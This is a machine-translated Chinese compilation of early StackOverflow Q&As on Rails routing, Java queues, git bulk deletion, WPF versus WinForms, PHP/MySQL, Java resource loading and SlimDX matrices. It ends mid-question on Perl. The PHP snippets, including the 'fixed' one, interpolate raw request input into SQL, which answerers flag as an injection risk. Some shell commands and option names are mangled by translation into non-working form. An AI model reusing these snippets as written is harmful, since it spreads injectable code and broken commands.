# StackOverflow 问答 000636000-000636999

# ruby-on-rails - 如何向 ActionController::Routing::Routes map.resources 添加自定义选项？

> ID：636008
> 
> 赞同：0
> 
> 时间：2009-03-11T19:33:45.270
> 
> 标签：ruby-on-rails, routes

我的 routes.rb 文件中有几个地方我说：

```
map.resources :foo, :only => [:show, :index] 
```

我想说：

```
map.resources :foo, :readonly => true 
```

..或类似的东西。我知道这可能看起来毫无意义，因为它只保存了几个字符，但我想知道如何做到这一点，以便将来可以添加其他更复杂的选项。

谢谢

-C

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-12T19:03:26.963

不是您要查找的内容，但您可以使用[Object#with_options](http://api.rubyonrails.org/classes/Object.html#M000277)节省一些输入：

```
map.with_options(:only => [:show, :index]) do |readonly|
  readonly.resources :foo
  readonly.resources :bar
  ...
end 
```

否则，您可能正在查看猴子补丁或子类化`ActionController::Routing::RouteSet::Mapper`。

# java - 可交换的工作队列

> ID：636011
> 
> 赞同：4
> 
> 时间：2009-03-11T19:34:09.420
> 
> 标签：java, concurrency, queue

这有一个名字，但我不知道它是什么，所以很难用谷歌搜索。

我正在寻找的是java并发实用程序中的东西，它是一对队列，生产者使用的“待处理”队列和消费者使用的“处理”队列，消费者可以在其中原子交换队列. 如果以这种方式使用（1 个生产者线程，1 个消费者线程），则各个队列不需要是线程安全的，只需对它们的引用。

我知道我以前在某个地方见过这个，我可能可以自己拼凑出这样的东西，但如果它已经存在，我宁愿使用它。

**编辑：**我想我正在寻找的原语是一对可以原子交换的原子引用。（&我可以自己添加队列。）

* * *

**编辑 2：** @Alex Miller 回答了我在想但想不起来的问题。然而，这并不能解决我的问题，因为它是一个线程障碍，我希望生产者不必阻塞。

@sfossin 关于交换对队列的引用的观点很好；我想要的是消费者开始从队列中检索和处理项目的那一刻，所有这些队列项目都必须是完整的，并且生产者之后不能添加任何项目；生产者现在必须将项目添加到另一个队列。所以配对/交换的原子引用集将不起作用。

（这有点像如果有两辆校车，其中一辆总是在等乘客，另一辆总是在其他地方送他们。一旦司机离开，就是这样，你必须上另一辆公共汽车。有参考可以让即使总线已经离开，生产者也可以访问总线，这是不允许的。）

我想我会做的是使用单个[ConcurrentLinkedQueue](http://java.sun.com/j2se/1.5.0/docs/api/java/util/concurrent/ConcurrentLinkedQueue.html)并具有消费者添加到队列中的哨兵值。这允许有多个生产者，而不仅仅是 1 个。为了让消费者处理队列中的批量项目，消费者等待队列中至少有 1 个项目，然后在队列的末尾插入哨兵队列，并删除项目，直到哨兵被删除。然后消费者在批次之间做它必须做的任何事情。这就是我想要的行为。

它不一定需要是一种有保证的非阻塞方法（锁定或`synchronized`方法是选项），但如果有一种简单的方法来构建它，那么这在我的应用程序中是首选。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T20:11:26.553

[交换器](http://java.sun.com/javase/6/docs/api/java/util/concurrent/Exchanger.html)？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T20:14:59.383

读/写锁定队列可能是一个更好的主意。因为，如果您否则必须以原子方式复制到本地队列。

由于您会遇到同步问题，如果您交换了引用，而其中一个正在读取/删除或写入。

[RWLock](http://java.sun.com/j2se/1.5.0/docs/api/java/util/concurrent/locks/ReadWriteLock.html)将允许多个消费者/生产者。

有什么理由，为什么你想远离 RWLocks？

与任何锁定一样，锁定应保持尽可能短的时间，以防止饥饿。

或使用类似的东西来交换数据。每个线程都有自己的队列。

```
 class LockedQueue
 {
    private final List<Data>  q = new ArrayList<Data>();
    private final Lock lock = new ReentrantLock();

    public void get( List<Data> consumerQ ) {
        if( lock.tryLock() ) { try { consumerQ .addAll( q ); q.clear(); } finally { lock.unlock(); }}
    }
    public Data put( List<Data> producerQ ) {
        if( lock.tryLock() ) { try { return q.addAll( producerQ  ); producerQ .clear(); } finally { lock.unlock(); }}
    }
    public void clear() {
        lock.lock(); try { q.clear(); } finally { lock.unlock(); }
    }
 } 
```

消费者调用 get()，当为空或在每个循环结束时，消费者调用 put，在添加了这么多项目或时间或......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T19:38:09.207

没有像您描述的那样具有双队列的数据结构，但是[并发实用](http://java.sun.com/javase/6/docs/api/java/util/concurrent/package-summary.html)程序有很多不同的队列可供选择。

您描述的问题很常见，但我也希望能找到一个。也许在 Java 1.7 中。

# git - 无法在 Git 中快速删除许多文件

> ID：636013
> 
> 赞同：6
> 
> 时间：2009-03-11T19:34:55.673
> 
> 标签：git

*我删除了 Git 分支newFeature*中的 777 个文件

```
rm !(example) 
```

我愿意承诺。Git 要求我手动删除每个已删除的文件

```
git rm file 
```

为所有名称不相似的 777 个文件编写上述命令将花费大量时间。

**如何在我的 Git 分支*newFeature*中删除这 777 个文件？** 我想保留它们作为备份以备后用，但现在，我想没有它们。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-03-11T19:52:40.407

```
git add -u 
```

它将“git删除”您删除的所有文件。

从[**Git 添加**](http://www.kernel.org/pub/software/scm/git/docs/git-add.html)：

你
——更新

仅更新 git 已经知道的文件，暂存修改的内容以进行提交，并将已删除的文件标记为删除。
这类似于 " `git commit -a`" 在准备提交时所做的事情，只是更新仅限于命令行上指定的路径。
如果未指定路径，则更新当前目录及其子目录中的所有跟踪文件。

* * *

“管道方式”确实是某种[脚本单行](http://www.jamesrobey.com/bash-script-to-remove-deleted-files-from-git/)

```
for i in ` git st | grep deleted | awk ‘{print $3}’ ` ; do git rm $i; done 
```

或用于带有 GnuWin32 的 Windows 机器

```
git st | grep deleted | gawk "{print \"git rm \"$3}" | cmd 
```

但`git add -u`它是主要的瓷器方式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-04-05T15:03:00.643

我喜欢... git status | grep 删除 | 切-f2 -d：| xargs git rm

# wpf - WPF 应用程序与 Winform 的商业应用程序的优势？

> ID：636028
> 
> 赞同：84
> 
> 时间：2009-03-11T19:38:36.943
> 
> 标签：wpf, winforms

我知道asp.net 和winform 开发。我不是那种仅仅因为它是新技术而跳入新技术的开发人员。它需要给我额外的好处，比如更高的生产力。

对于纯商业应用程序，WPF 相对于 Winforms 的优势是什么？我对 WPF 提供的额外的养眼、动画、渐变、图像显示效果等不感兴趣。商业应用程序用于数据输入、数据报告以及一些图表和照片的静态显示。

WPF 将如何帮助这些应用程序？更好更丰富的数据绑定？WinForm 是一项成熟的成熟技术，我喜欢我可以在 Visual Studio 和 WPF 的多个 IDE（VS 和 Blend 系列）中做任何事情。另外，我认为 WPF 没有像 Winform 对应物（DataGridView..etc）那样丰富的数据绑定控件。AFAIK，微软仍将支持 Winforms 多年。

尝试说服像我这样的人转换。

* * *

## 回答 #1

> 赞同：101
> 
> 时间：2009-03-12T00:24:41.470

> 我知道asp.net 和winform 开发。我不是那种仅仅因为它是新技术而跳入新技术的开发人员。它需要给我额外的好处，比如更高的生产力。

对于我的团队来说，事实证明 WPF 比 WinForms 开发应用程序要快得多。我们最近在 32 个工作日内发布了一款中型应用程序。我们的优势在于团队中有一位经验丰富的 WPF 开发人员，以及渴望学习这项技术的缺乏经验的人。士气高涨，生产力令人印象深刻。

> WinForm 是一项成熟的成熟技术，我喜欢我可以在 Visual Studio 和 WPF 的多个 IDE（VS 和 Blend 系列）中做任何事情。

您认为自己是手动编码器还是拖放编码器？如果您认为自己是拖放器，那么当前的 WPF 工具可能不适合您。也许等待 Visual Studio 2010？我几乎只在 XAML 中工作。大多数 WPF 爱好者可能会同意这是目前创建 WPF 应用程序的最有效方式。但是，我也手工制作我的 HTML，所以对我来说感觉很自然......

> 对于纯商业应用程序，WPF 相对于 Winforms 的优势是什么？我对 WPF 提供的额外的养眼、动画、渐变、图像显示效果等不感兴趣。

我曾经是这样想的，但我最近开发了一个具有渐变、基本动画和效果的业务应用程序。添加了这些花哨的功能以增强用户体验。为什么商业应用程序应该是战舰灰色？为什么它们不能使用？诚然，使商业应用程序可用的不是颜色、渐变、动画，但使用这些效果可以帮助用户体验，这对我来说很重要。我本可以在 WinForms 中的 WPF 应用程序中完成我所做的一切 - 只是需要更长的时间。

> 更好更丰富的数据绑定？

数据绑定支持确实令人惊叹。这是我在平台中最喜欢的一个功能。查看[这个精彩的数据绑定备忘单](http://www.nbdtech.com/Free/WpfBinding.pdf)。

> 尝试说服像我这样的人转换。

我已经决定我不会试图说服其他人切换到 WPF。我试图“说服”的开发人员（所有有经验的 Winforms 开发人员）通常都在与该平台作斗争。他们没有投资于技术。他们不“明白”。我鼓励人们检查这项技术，看看它是否适合他们作为开发人员。学习曲线是巨大的。如果您通过书本学习，请查看[此 SO 帖子](https://stackoverflow.com/questions/9591/what-wpf-books-would-you-recommend/9919#9919)以获取有关 WPF 书籍的一些小型评论。如果您通过视频学习，请查看[windowsclient.net WPF 视频](http://windowsclient.net/learn/videos_wpf.aspx)。如果您通过示例学习，请查看[此](https://stackoverflow.com/questions/534328/good-example-wpf-applications)或[此](https://stackoverflow.com/questions/7837/what-real-world-wpf-applications-are-out-there)邮政。忘掉你所知道的关于 WinForms 的一切。WPF 似乎比 WinForms 更接近 ASP。创建一些示例应用程序。看看它是否适合您和您的团队。

由于您是多技能（asp.net/winform 技能），您可能会看到 WPF 中技能提升的优势，因为它与 Silverlight 密切相关。Silverlight 填补了富客户端应用程序和 Web 应用程序之间的空白。

我个人认为 WPF 是可用于 .NET 框架的最佳客户端技术，并且通常会避免在 WinForms 中进行开发以备将来工作。YMMV

祝你的决定好运。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2009-03-11T19:52:29.453

我有相当多的winforms经验，只玩过一点WPF，但我被卖了。

为什么？

*   更大的灵活性。如果你想在 winforms 中做任何非标准的事情，痛苦和折磨随之而来，但在 WPF 中它很简单。

*   更好的数据绑定

*   更容易开发（一旦你理解了核心概念，不幸的是这需要一段时间）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-12T00:51:14.370

刚开始看WPF的时候，我把它当成“带有矢量图形的Winforms”，直接跑到了学习悬崖的一边。从 WinForms 过渡到 WPF 的正确方法是大剂量地服用任何你可以接触到的麻醉剂，以便忘记你所知道的一切，然后从头开始。

不过说真的 - 如果您使用诸如 Model-View-ViewModel 之类的模式，它会更干净、更容易。[在The Orbifold](http://www.orbifold.net/default/?p=550)上阅读更多信息，这个[Google Groups 线程](http://groups.google.com/group/wpf-disciples/browse_thread/thread/3fe270cd107f184f?pli=1)和[Channel9](http://channel9.msdn.com/shows/Continuum/MVVM/)

然后在某个时候，你会顿悟并开始对所有内容进行数据绑定。您的代码隐藏将成为对 InitializeComponent() 的调用。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2010-07-30T11:31:17.910

谢谢你的帖子。我的公司在 WinForms 上投入了大量时间。我无法想象在 32 个工作日内完成一个中型应用程序；我们的认证周期是连续几个月，发布周期有时是一年或更长（尽管我们尽可能地坚持敏捷开发理念），这就是我们开发的应用程序的本质。

我刚刚第一次玩 WPF，发现我可以通过使用 ElementHost 在 WinForms 中获得 WPF 的一些好处。我扩展了一个 WPF 文本框，然后将我的扩展类包装在一个 Win Forms UserControl 中，现在有了一个使用该 WPF 文本框的 WinForms 应用程序，并提供拼写检查支持。

看到 Microsoft 考虑到这一点（在 WinForms 中托管 WPF，反之亦然）给我留下了深刻的印象，因为我真的看不到我的公司迁移到 WPF，除非我们可以在很长一段时间内过渡；对 WinForms 的投资太多了，无法重新开始。根据我最近的经历，我可能会开始与其他一些开发人员谈论我最近的经历，看看他们的想法是什么。我认为 WPF 需要一些时间来适应，这似乎与其他评论一致。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-11T19:43:26.200

不是完全重复，但您可能会发现这篇文章有助于了解 WPF 除了新的图形位之外的好处。

[WPF 或 WinForms 用于内部工具？](https://stackoverflow.com/questions/627590/wpf-or-winforms-for-internal-tools)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-11T19:45:50.610

只需在 Stackoverflow 中查看此搜索结果即可获得大量答案。 [https://stackoverflow.com/search?q=WPF+Winforms](https://stackoverflow.com/search?q=WPF+Winforms)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-11T19:49:30.257

想象一下，如果您可以将 ASP.NET/(Silverlight) 页面中的相同 UI(XAML) 与桌面应用程序一起使用。您只需构建一次，但将其连接到任何一个......这是 WPF/XAML 的意图之一......我们真的在那里吗？还没有，但越来越近了。

# poco - 实现数据传输对象或 POCO 时的最佳实践是什么？你的 POCO 应该是什么样子？

> ID：636030
> 
> 赞同：3
> 
> 时间：2009-03-11T19:38:45.353
> 
> 标签：poco

以下哪项是实施 poco 的最佳方式？

选项1：

```
public class PocoOption1
{
  public PocoOption1(int val1,string val2)
  {
    Val1=val1; Val2=val2;
  }

  public int Val1{get;private set;}
  public int Val2{get;private set;}
} 
```

选项 2：

```
public class PocoOption2
{           
  public int Val1{get;set;}
  public int Val2{get;set;}
} 
```

每种方法的潜在利弊是什么？有关系吗？有人说一个 DTO 应该只设置一次。是规定还是意见？？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T19:46:59.280

使用新的 C# 语法，您可以执行以下操作：

```
Customer customer =  new Customer{ Id = 1, 
     Name="Dave",                                             
     City = "Sarasota" }; 
```

您可以安全地使用选项 2。

请[在此处查看](http://msdn.microsoft.com/en-us/library/bb384062.aspx)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-11T20:10:40.410

选项略有不同。选项 1 只允许您设置 Val1、Val2 一次。选项 2 允许您设置和重置这些值。

一般来说，我是公共默认构造函数的粉丝。它使 API 更易于使用。Krzysztof Cwalina 和 Brad Abrams 在框架设计指南一书中对此进行了详细讨论。以下是重点：

*   使用“创建、设置、调用”模式。有一个没有参数的默认构造函数。然后允许在对象上设置属性（以任何顺序）。然后允许调用方法。
*   默认构造函数是对象构造的规范方法。这将是用户尝试的第一个选项。
*   强制用户在构建时选择参数可能很困难。此外，一些参数可能是可选的。
*   让您的对象在有限的时间内处于无效状态。抛出异常以传达 API 滥用。（如果一个对象有两个依赖项，如果用户尝试在没有必要设置的情况下调用方法，则抛出 InvalidOperationException。）

在我看来，选项2是要走的路。

# php - 为什么我会收到 MySQL 错误“查询为空”？

> ID：636032
> 
> 赞同：8
> 
> 时间：2009-03-11T19:40:45.940
> 
> 标签：php, mysql

```
$id = $_REQUEST['id'];
$Section = $_REQUEST['section'];
$Subject = $_REQUEST['subject'];
$type = $_REQUEST['type'];
$Start_date1 = isset($_REQUEST['startTxt'])?($_REQUEST['startTxt']):"";
$Venue = isset($_REQUEST['venTxt'])?($_REQUEST['venTxt']):"";
$Facilitator = isset($_REQUEST['faciTxt'])?($_REQUEST['faciTxt']):"";
$Level = isset($_REQUEST['lvlLst'])?($_REQUEST['lvlLst']):"";
$Date1 = $_REQUEST['date1'];

if(isset($_REQUEST['EDIT']))
{
    mysql_query("UPDATE service SET Start_date='$Date1', Venue='$Venue', Facilitator='$Faci' WHERE ServiceID ='$id'");
    if (!mysql_query($sql,$con))
    {
        die('Error: ' . mysql_error());
    }

    echo '<script type="text/javascript">';
    echo 'alert("Changes have been save!");';
    echo 'window.location="Admin_RecSchedMapLst.php";';
    echo '</script>';
    mysql_close($con);
} 
```

当我单击保存时，它返回“错误：查询为空” - 这是为什么？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-03-11T19:44:19.410

您调用`mysql_query()`了两次，一次使用不存在的`$sql`参数：

```
mysql_query("UPDATE service SET Start_date='$Date1', Venue='$Venue', Facilitator='$Faci' WHERE ServiceID ='$id'");
if (!mysql_query($sql,$con)) 
```

应该：

```
if (!mysql_query("UPDATE service SET Start_date='$Date1', Venue='$Venue', Facilitator='$Faci' WHERE ServiceID ='$id'")) 
```

你也没有逃避你的输入，让你对 SQL 注入开放。您应该理想地使用绑定参数，或者至少通过[`mysql_real_escape_string()`](http://www.php.net/mysql_real_escape_string).

例如：

```
$Date1 = mysql_real_escape_string($Date1, $conn); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-10-15T02:37:33.893

请出于对互联网的热爱，不要自己构建 SQL 查询。使用[PDO](http://php.net/pdo)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-11T19:44:32.563

您没有设置 $sql 变量并调用 mysql_query() 两次。

# javascript - 插入包含 Rails RESTful URL 的元素的不显眼的 Javascript？

> ID：636040
> 
> 赞同：2
> 
> 时间：2009-03-11T19:43:37.883
> 
> 标签：javascript, jquery, ruby-on-rails, ruby

我有一个带有单个渲染 iFrame 的简单页面。有一个名为“添加文件”的链接，我想悄悄地将一个事件附加到“添加文件”锚点，以便单击时，它会在现有的 iFrame 下方插入一个新的 iFrame，并增加 iFrame 的 ID。

iFrame 的一个示例是：

```
<iframe name="uploadForm1" id="uploadForm1" src="<%= upload_file_url %>" height="50" width="800" frameborder="0" scrolling="no"></iframe> 
```

然后，当单击“添加文件”按钮时，我最终会得到：

```
<iframe name="uploadForm1" id="uploadForm1" src="<%= upload_file_url %>" height="50" width="800" frameborder="0" scrolling="no"></iframe>
<iframe name="uploadForm2" id="uploadForm2" src="<%= upload_file_url %>" height="50" width="800" frameborder="0" scrolling="no"></iframe> 
```

实现这一目标的最佳方法是什么（jQuery 或 Prototype）？

然而，这似乎很微不足道，因为我需要渲染 upload_file_url 路由，我不太确定如何在不浪费大量时间的情况下处理它！

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-11T19:57:18.880

这应该为你做：

```
var g_maxNum = 1; // The latest iframe number

function copyIframe()
{
    // Get the latest iframe
    var iframe = document.getElementById('uploadForm' + g_maxNum);
    g_maxNum++

    // Create a new iframe by cloning the existing one
    var newIframe = iframe.cloneNode(true);
    // Update the properties
    newIframe.name = 'uploadForm' + g_maxNum;
    newIframe.id = newIframe.name

    // Insert it after the last iframe
    iframe.parentNode.insertBefore(newIframe, iframe.nextSibling);
} 
```

# java - 文件未找到。为什么不？

> ID：636046
> 
> 赞同：4
> 
> 时间：2009-03-11T19:45:23.217
> 
> 标签：java, file, file-io, io

好的，我正在尝试使用以下代码在 Java 中加载文件：

```
String file = "map.mp";
URL url = this.getClass().getResource(file);
System.out.println("url = " + url);
FileInputStream x = new FileInputStream("" + url); 
```

尽管该文件与该类位于同一文件夹中，但它说找不到它（是的，它**位于**完整代码中的 try catch 块中）。

但是，它会找到另一个使用相同代码但名称不同的文件：

```
URL url = this.getClass().getResource("default.png");
System.out.println("url2 = " + this.getClass().getResource("default.png"));
BufferedImage img = ImageIO.read(url); 
```

为什么我的代码找不到我的 map.mp 文件？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-03-11T19:48:50.070

您正在尝试使用 url，就好像它是文件名一样。不会的。它会以 . 开头`file://`。在其他部署方案中，可能根本没有要打开的实际文件——例如，它可能位于 jar 文件中。如果你真的，真的必须使用，你可以使用`URL.getFile()`- 但最好不要使用。

使用`getResourceAsStream`而不是`getResource()`- 直接给你一个`InputStream`。或者，`getResource()`如果您想要其他内容的 URL，请继续使用，然后使用`URL.openStream()`获取数据。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-11T19:48:22.007

`FileInputStream`将文件名作为参数，而不是 URL 字符串。

获取 a`URL`指向的内容的常用方法是使用`openStream`. 您可以在不`URL`使用`Class`/的情况下打开资源流`ClassLoader.getResourceAsStream`（它会在实现中打开 URL）。

或者，您可以使用以下命令打开**文件**URL：

```
InputStream in = FileInputStream(new File(url.toURI())); 
```

对于资源，这将要求您在文件系统上的 jar 之外具有原始类文件。JNLP（Java WebStart）有一个API，用于打开文件是一种安全的方式。

一般来说：当转换为一个`String`用途`toString`或`String.valueOf`清楚你在做什么时。另请注意，`String`它的类型有点弱，因为该类型没有说明它包含的数据的格式，所以喜欢`URI`or之类的`File`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T19:50:17.167

尝试查看是否找到了您尝试访问的文件或预期的文件。使用[系统内部文件监视器](http://technet.microsoft.com/en-us/sysinternals/bb896642.aspx)。它有助于监控 SO 正在访问哪些文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-10-20T23:45:54.580

你的道路上有空间吗？你看到 %20 了吗？删除它。然后，这将起作用： getResource(file) 就像 getResourceAsStream() 一样。

空间在路径中是邪恶的。始终避免它们。

# emacs - Putty 上的 Emacs 突然停止接受 ctrl-space？

> ID：636058
> 
> 赞同：0
> 
> 时间：2009-03-11T19:47:51.290
> 
> 标签：emacs, keyboard, putty

奇怪的是，ctrl-space 开始标记在 putty 的命令行和机器上的 X 上有效，只是在 putty 中无效。我破坏了什么配置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-11T20:56:03.543

另一个问题不适用，因为 ctrl-space 被发送到 putty 中的命令行，而不是 emacs。

# .net - 更新.net和php之间的表单身份验证票到期的好策略是什么？

> ID：636061
> 
> 赞同：0
> 
> 时间：2009-03-11T19:48:43.677
> 
> 标签：.net, php, asp.net, cookies, forms-authentication

我正在创建一个应用程序，该应用程序将从.net 获取存储表单身份验证票证的 cookie 的内容。那部分已经完成。该票证中包含过期时间，默认为 20 分钟。

所以场景是，用户登录并在 .net 端进行验证。然后它们被重定向到我的 PHP 应用程序。我得到用户名，票到期等。

当用户在我的应用程序上保持活跃时，更新票证的最佳方法是什么？这里有两种可能的方法，我相信还有更多：

1.  距离到期还有 10 分钟，如果用户仍然处于活动状态，则会联系 .net Web 服务向我开具新的到期票。当页面空闲 20 分钟时，用户被重定向到原始的 .net 登录。

2.  PHP 使用 cookie 来处理过期问题。当它接近 10 分钟并且用户仍在浏览时，它会刷新。但是当页面空闲 20 分钟时，用户会被重定向回原来的 .net 登录。

其他建议？优点，缺点？我正在寻找速度和安全性。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T20:34:07.717

我会从您的问题中假设您没有使用持久性 cookie，并且您正在使用滑动到期。如果您打算尝试在 php 中复制相同的行为，那么您可能想看看[这个](http://support.microsoft.com/kb/910443)。

> 举个例子：如果登录页面是在下午 5:00 00:00:00 访问的，如果 timeout 属性为 10 并且slidingExpiration 属性设置为 TRUE，它应该在下午 5:10 00:00:00 过期. 现在，如果在下午 5:05 00:00:00 再次浏览任何网页，cookie 和票证超时期限将重置为下午 5:15 00:00:00。

基本上，每当用户访问您的一个 php 页面时，您都会更新 cookie 的过期时间。

另一种选择是在您的页面中嵌入类似 IFRAME 的内容，这会从您的 .net 站点中拉下一个 .aspx。这将具有“刷新”cookie 的效果。

# java - Java Enterprise 应用程序中的类加载问题

> ID：636072
> 
> 赞同：3
> 
> 时间：2009-03-11T19:51:25.120
> 
> 标签：java, memory-leaks, glassfish, ejb-3.0

我在 Glassfish 服务器上有带有 EJB3 和 JSF 的企业应用程序。在运行这个应用程序超过 2 周后，我意识到我的类加载有问题。我不认为这是 permgen 的问题。每次打开页面时都会加载这些类，但它们从未从内存中删除。这是我的服务器内存的快照：

[快照](http://vasura.s3.amazonaws.com/classLoadingProblem.JPG)

所以，我只需要一些关于如何调试这个问题的指示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T20:15:17.137

有一个[很好的解释](http://blogs.oracle.com/fkieviet/entry/classloader_leaks_the_dreaded_java)为什么会发生这种事情，以及最近对类似问题的[描述](http://drorbr.blogspot.com/2008/11/javalangoutofmemoryerror-permgen-space.html)。

使用[jhat](http://java.sun.com/javase/6/docs/technotes/tools/share/jhat.html)可能有助于找出哪些类占用了内存，然后寻找可能持有它们/或类加载器的静态引用，从而防止正确卸载。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T20:21:56.823

看起来您并没有重新加载您的应用程序，这将是显而易见的答案。你真的想知道这些类是什么。

反射和 XSLT[C] 是创建类的明显目标，但这似乎非常常规。大概有一些基于时间的缓存以某种方式泄漏。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T20:43:56.663

如果您使用的是 JSF Web 框架（MyFaces、ICEFaces 等），这可能是一个问题。特别是考虑到您没有重新部署应用程序，但是当页面打开/关闭时会发生这种情况。我建议您在进行更多调试和分析之前检查适当的问题跟踪器。

此外，您可以尝试将应用程序部署在本地计算机上，故意使用较低的堆空间，并尝试通过仅浏览应用程序的网页来持续重现内存泄漏。希望您能够准确地意识到什么样的动作会导致新类被加载。

# visio - Visio 中使用的“系统序列”字段是什么？

> ID：636074
> 
> 赞同：0
> 
> 时间：2009-03-11T19:51:40.907
> 
> 标签：visio

在 Visio 的系统序列图中放置消息调用（从一条活动生命线到另一条活动生命线的箭头）时，我注意到有一个名为“系统序列”的属性。有谁知道这个领域的预期用途是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-11T19:54:33.410

抱歉这个问题被问得太快了我在 Visio 的内置帮助中找到了答案：

键入消息的序列表达式。在序列图中，您可以省略序列号。在协作图中，消息序列号通常嵌套以指示级别。例如，消息 3.1.4 跟在激活 3.1 中的消息 3.1.3 之后。

# c# - 如何在 C# 中一次旋转、缩放和平移矩阵？

> ID：636081
> 
> 赞同：8
> 
> 时间：2009-03-11T19:52:37.190
> 
> 标签：c#, matrix, translation, slimdx

好的，这应该是一个简单的矩阵问题，但是我对矩阵的理解有些有限。这是场景：我有一个 1px x 1px 的精灵，我想按一定量 x 和 y 缩放（每边不同的量），然后我想将该精灵旋转某个角度，然后我希望能够精确定位整个事物（从左上角或中心，对我来说没有区别）。

到目前为止，我的代码模糊地接近，但根据我传入的角度，它往往会偏离一些随机量。

我认为这样做可以：

```
 Point center = new Point( 50, 50 );
        float width = 60;
        float height = 100;
        float angle = 0.5;
        Vector3 axis = new Vector3( center.X, center.Y, 0 );
        axis.Normalize();
        Matrix m = Matrix.Scaling( width, height, 0 ) *
            Matrix.RotationAxis( axis, angle ) *
            Matrix.Translation( center.X, center.Y, 0 ); 
```

但它往往会缩小旋转线的比例，即使我认为它的定位是正确的。

我也试过这个：

```
 Matrix m = Matrix.Transformation2D( new Vector2( center.X, center.Y ), 0f,
      new Vector2( width, height ), new Vector2( center.X, center.Y ),
      angle, Vector2.Zero ); 
```

这条线看起来完全正确，大小和形状都完全正确，但我根本无法正确定位它。如果我在上述调用结束时使用平移向量，或者如果我使用 Sprite.Draw 设置位置，则两者都无法正常工作。

这一切都在 SlimDX 中。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-03-11T20:04:07.820

我刚刚经历了学习矩阵变换的痛苦，但是使用了 XNA。

我发现[这些](http://www.ziggyware.com/readarticle.php?article_id=100) [文章](http://www.riemers.net/eng/ExtraReading/matrices_geometrical.php) [对](http://www.riemers.net/eng/Tutorials/XNA/Csharp/Series1/Rotation_-_translation.php) [理解](http://msdn.microsoft.com/en-us/library/ms536397(VS.85).aspx) 发生的事情[非常有帮助。](http://msdn.microsoft.com/en-us/library/eews39w7.aspx)XNA 中的方法调用非常相似，其背后的理论都应该适用于您，即使使用 SlimDX。

看一眼你的代码，我认为你应该在开始时翻译到原点，然后在最后再翻译到最终位置，尽管我在这方面还是有点新手。

我这样做的顺序是：

*   翻译为原点
*   规模
*   旋转
*   翻译到所需位置

首先翻译到原点的原因是*旋转是基于原点的*。因此，要围绕某个点旋转某些东西，请在旋转之前将该点放在原点上。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-12T02:32:52.627

好的，这正在工作。这是我的工作代码，以防其他人需要它：

```
 Point sourceLoc = new Point ( 50, 50 );
    float length = 60;
    float thickness = 2;
    float angle = 0.5;
    Matrix m = Matrix.Scaling( length, thickness, 0 ) *
            Matrix.RotationZ( angle ) *
            Matrix.Translation( sourceLoc.X, sourceLoc.Y, 0 );
    sprite.Transform = m;

    sprite.Draw( this.tx, Vector3.Zero, Vector3.Zero, Color.Red ); 
```

这将绘制一条您选择的长度的斜线，其厚度等于您选择的厚度（假设您的纹理是 1x1 像素的白色图像）。源位置是发射线的位置，无论您指定什么角度（以弧度为单位）。因此，如果您从零开始并以 0.1 之类的增量递增直到达到 2PI，然后重置为 0，您将拥有一条围绕中心旋转的线，如时钟指针或雷达扫描。这就是我一直在寻找的——感谢所有做出贡献的人！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T20:18:28.533

您需要做的是一次一步地进行每个转换。做缩放先画它。是不是你期望的地方。然后加入旋转，然后平移。这将有助于发现不正确的假设。

您还可以绘制临时线以帮助确定坐标的位置。例如，如果您进行拉伸和旋转，并期望您的终点位于 0,0。在 0,0 处绘制一个端点为另一条线将用作仔细检查，看看是否真的如此。

对于您的具体问题，问题可能与旋转有关。缩放和旋转后，线现在偏离中心，导致您在翻译时出现问题。

一般的解决方案是将线移回原点，执行任何涉及更改其形状或方向的操作。之后，因为您在一个已知的好位置，您可以翻译到您的最终目的地。

**回应评论**

如果平移是一个问题并且您正在转换坐标系，那么您将需要编写一个转换函数来在旧系统和新系统之间进行转换。

例如，如果您旋转 45 度。在旋转之前，您可以平移 0,1 以向上移动 1 英寸。旋转后，您必须大致平移 -.70707、.070707 才能相对于原始坐标系向上移动 1 英寸。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T20:30:02.127

您是否围绕正确的轴旋转？我是矩阵材料的新手，但在我看来，由于精灵存在于 x、y 空间中，旋转轴应该是 Z 轴 - 即 (0,0,1)。

# perl - Why doesn't Perl print the last text before it exits?

> ID：636083
> 
> 赞同：4
> 
> 时间：2009-03-11T19:53:14.430
> 
> 标签：perl, printf, exit

My code won't run the last line right before " `exit;` " and I have no clue why. I tried to put an additional `printf $fh` line before `exit`, but that didn't work either; it would not print either line. Everything else prints fine except the last print statements before the exit.

Any clue why this happens? Or better yet, how to fix or work around it?

```
 if($i>0 && $i<3)
    {
        printf $fh "Partial match found.\n";
        if($matched_uid){printf $fh "UID #: ".$arguid." exists.\n";}
